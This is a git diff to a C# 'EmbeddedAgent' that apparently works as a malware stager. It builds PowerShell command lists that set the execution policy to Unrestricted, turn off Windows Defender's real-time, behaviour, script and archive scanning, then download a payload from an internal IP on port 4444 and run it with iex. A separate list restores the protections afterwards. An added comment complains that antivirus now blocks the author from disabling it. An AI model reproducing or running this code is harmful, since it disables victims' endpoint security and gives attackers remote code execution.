@@ -39,6 +39,10 @@ namespace EmbeddedAgent
             return File.Exists(Path.Combine(Directory.GetCurrentDirectory(), "launcher.bat"));
         }
 
+        /*
+        * TODO test cases
+        *I have to figure out why now the av doesn't let me disable it and run my command
+        */
         public static List<string> InitCommands()
         {
 
@@ -48,18 +52,20 @@ namespace EmbeddedAgent
             {
                 $"cd $env:tmp",
                 "Set-ExecutionPolicy Unrestricted",
-                "Set-MpPreference -DisableRealtimeMonitoring $true",
-                "Set-MpPreference -DisableBehaviorMonitoring $true",
-                "Set-MpPreference -DisableBlockAtFirstSeen $true",
-                "Set-MpPreference -DisableIOAVProtection $true",
-                "Set-MpPreference -DisablePrivacyMode $true",
-                "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true",
-                "Set-MpPreference -DisableArchiveScanning $true",
-                "Set-MpPreference -DisableIntrusionPreventionSystem $true",
+                "Set-MpPreference -DisableRealtimeMonitoring $True",
+                "Set-MpPreference -DisableBehaviorMonitoring $True",
+                "Set-MpPreference -DisableBlockAtFirstSeen $True",
+                "Set-MpPreference -DisableIOAVProtection $True",
+                "Set-MpPreference -DisablePrivacyMode $True",
+                "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $True",
+                "Set-MpPreference -DisableArchiveScanning $True",
+                "Set-MpPreference -DisableScriptScanning $True",
+                "Set-MpPreference -DisableIntrusionPreventionSystem $True",
                 "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.76.131:4444/download/powershell/Om1hdHRpZmVzdGF0aW9uIGV0dw==') -UseBasicParsing|iex",
                 ".\\launcher.bat"
             }; ;
         }
+
         /*
          * TODO test cases
          * 
@@ -73,14 +79,14 @@ namespace EmbeddedAgent
             return new List<string>
             {
                 "Set-ExecutionPolicy Restricted",
-                "Set-MpPreference -DisableRealtimeMonitoring $false",
-                "Set-MpPreference -DisableBehaviorMonitoring $false",
-                "Set-MpPreference -DisableBlockAtFirstSeen $false",
-                "Set-MpPreference -DisableIOAVProtection $false",
-                "Set-MpPreference -DisablePrivacyMode $false",
-                "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $false",
-                "Set-MpPreference -DisableArchiveScanning $false",
-                "Set-MpPreference -DisableIntrusionPreventionSystem $false"
+                "Set-MpPreference -DisableRealtimeMonitoring $False",
+                "Set-MpPreference -DisableBehaviorMonitoring $False",
+                "Set-MpPreference -DisableBlockAtFirstSeen $False",
+                "Set-MpPreference -DisableIOAVProtection $False",
+                "Set-MpPreference -DisablePrivacyMode $False",
+                "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $False",
+                "Set-MpPreference -DisableArchiveScanning $False ",
+                "Set-MpPreference -DisableIntrusionPreventionSystem $False"
             }; ;
         }
     }
